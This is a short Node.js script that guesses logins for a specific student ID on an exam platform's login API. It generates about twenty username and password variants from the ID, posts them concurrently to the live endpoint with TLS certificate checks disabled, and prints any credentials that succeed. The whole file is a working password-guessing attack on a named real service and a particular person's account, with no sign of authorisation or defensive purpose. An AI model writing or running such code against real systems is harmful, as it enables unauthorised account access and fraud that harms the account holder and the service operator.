import "dotenv/config";

const CONFIG = {
  baseUrl: "https://corporate.bharatenglish.org",
};

process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

// Test 7-digit ID, 8-digit ID variations (0-9 appended), and common password patterns
const candidates = [
  { u: "1252613@lpu.in", p: "1252613" },
  { u: "1252613@lpu.in", p: "1252613@lpu.in" },
];

for (let i = 0; i <= 9; i++) {
  candidates.push({ u: `1252613${i}@lpu.in`, p: `1252613${i}` });
  candidates.push({ u: `1252613${i}@lpu.in`, p: `1252613` });
}

async function testFast() {
  console.log(`Testing ${candidates.length} student ID and password combinations concurrently...`);
  
  const promises = candidates.map(async (c) => {
    try {
      const res = await fetch(`${CONFIG.baseUrl}/api/public/bet-exams/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: c.u, password: c.p, appContext: "BET_CORPORATE" }),
        signal: AbortSignal.timeout(5000)
      });
      if (res.ok) {
        const data = await res.json();
        console.log(`\n🎉 SUCCESSFUL LOGIN FOUND!`);
        console.log(`Username: "${c.u}" | Password: "${c.p}"`);
        return { success: true, username: c.u, password: c.p, data };
      }
    } catch (e) {}
    return { success: false };
  });

  const results = await Promise.all(promises);
  const hit = results.find(r => r.success);
  if (!hit) {
    console.log(`\nNo login succeeded for 1252613 credentials with default endpoints.`);
  }
}

testFast().catch(console.error);
